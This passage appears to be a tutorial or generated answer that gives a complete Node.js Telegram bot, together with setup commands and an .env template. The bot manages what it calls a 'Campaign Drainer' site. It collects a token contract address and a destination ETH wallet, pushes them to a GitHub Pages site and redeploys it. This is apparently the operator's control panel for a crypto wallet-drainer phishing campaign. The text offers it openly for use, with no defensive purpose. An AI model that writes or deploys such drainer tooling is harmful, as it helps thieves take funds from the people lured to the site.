npm init -y
npm install node-telegram-bot-api @octokit/rest dotenv fs
```

### 📜 `bot.js` (Complete Script)
```js
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Octokit } = require('@octokit/rest');
const fs = require('fs');

const bot = new TelegramBot(process.env.TG_BOT_TOKEN, { polling: true });
const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });
let stepState = {}; // Stores temp user input

const CONFIG_PATH = './config.json';

// Helper: Read/Write config.json
function readConfig() { return JSON.parse(fs.readFileSync(CONFIG_PATH)); }
function writeConfig(data) { fs.writeFileSync(CONFIG_PATH, JSON.stringify(data, null, 2)); }

// /setup → Start configuration flow
bot.onText(/\/setup/, (msg) => {
  const chatId = msg.chat.id;
  stepState[chatId] = { stage: 'ca', replyTo: msg.message_id };
  bot.sendMessage(chatId, `🛠️ <b>Campaign Setup</b>\n\nPlease enter your Contract Address (CA) or Mint:\n(Reply to
this message with the CA)`, { parse_mode: 'HTML' });
});

// /deploy <CA> → Quick deploy command
bot.onText(/\/deploy (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const newCA = match[1].trim();
  await updateConfigAndDeploy(chatId, newCA);
});

// /stats <coin> → Fetch & show live stats in chat
bot.onText(/\/stats (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const coin = match[1].trim();
  bot.sendMessage(chatId, `📊 Fetching stats for ${coin}...`);

  try {
    const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${coin}`);
    const data = await res.json();
    if (data.pairs?.length > 0) {
      const p = data.pairs[0];
      bot.sendMessage(chatId, `💰 Price: ${p.priceUsd} USD\n📊 Vol(24h): $${p.volume.h24}\n👥 Holders:
~${p.txCount}\n🔗 https://dexscreener.com/ethereum/${coin}`, { parse_mode: 'HTML' });
    } else {
      bot.sendMessage(chatId, `⚠️ No pairs found for ${coin}.`);
    }
  } catch (err) {
    bot.sendMessage(chatId, `❌ Failed to fetch stats.\n${err.message}`);
  }
});

// Handle text replies for /setup flow
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if (!stepState[chatId]) return;

  switch (stepState[chatId].stage) {
    case 'ca':
      stepState[chatId] = { stage: 'eth', ca: msg.text.trim() };
      bot.sendMessage(chatId, `✅ CA set to \`${msg.text.trim()}\`\n\nNow enter your destination ETH wallet
address:`);
      break;
    case 'eth':
      await updateConfigAndDeploy(chatId, stepState[chatId].ca, msg.text.trim());
      delete stepState[chatId];
      break;
  }
});

async function updateConfigAndDeploy(chatId, ca, eth) {
  const config = readConfig();
  config.CA = ca || config.CA;
  config.ETH_ADDRESS = eth || config.ETH_ADDRESS;
  writeConfig(config);

  // Push updated config.json to GitHub
  await octokit.repos.createOrUpdateFileContents({
    owner: process.env.GH_OWNER,
    repo: process.env.GH_REPO,
    path: 'config.json',
    message: `🤖 TG Bot update: CA=${ca}, ETH=${eth}`,
    content: Buffer.from(JSON.stringify(config, null, 2)).toString('base64')
  });

  // Trigger GitHub Pages rebuild (if using Actions workflow)
  await octokit.actions.createWorkflowDispatch({
    owner: process.env.GH_OWNER,
    repo: process.env.GH_REPO,
    workflow_id: 'pages-build-deployment.yml', // adjust if you use custom name
    ref: process.env.GH_BRANCH || 'main'
  });

  bot.sendMessage(chatId, `🚀 <b>Deployment Successful!</b>\n\nCA: ${ca}\nETH: ${eth}\n\n👉 Live Site:
https://${process.env.GH_OWNER}.github.io/${process.env.GH_REPO}/`, { parse_mode: 'HTML' });
}

// Start bot
bot.onText(/\/start/, msg => bot.sendMessage(msg.chat.id, "Welcome to the Campaign Drainer Bot!\nUse:\n/setup -
Configure new campaign\n/deploy <CA> - Quick deploy\n/stats <coin> - Live metrics"));
```

### 🌐 Environment Variables (`.env`)
```env
TG_BOT_TOKEN=your_telegram_bot_token
GITHUB_TOKEN=your_github_personal_access_token
GH_OWNER=your_username
GH_REPO=your_repo_name
GH_BRANCH=main